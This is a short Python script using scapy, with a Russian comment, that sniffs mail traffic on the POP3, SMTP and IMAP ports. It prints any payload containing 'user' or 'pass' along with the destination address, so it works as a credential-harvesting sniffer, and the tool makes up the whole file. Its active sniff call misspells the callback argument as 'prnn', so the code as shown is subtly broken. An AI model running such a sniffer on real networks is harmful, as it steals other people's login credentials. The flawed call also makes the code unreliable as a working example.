from scapy.all import sniff, TCP, IP


# обратный вызов для обработки пакетов
def packet_callback(packet):
    print(packet.show())
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    # sniff(filter='tcp port 21', prn=packet_callback, store=0)  # FTP
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prnn=packet_callback, store=0)


if __name__ == '__main__':
    main()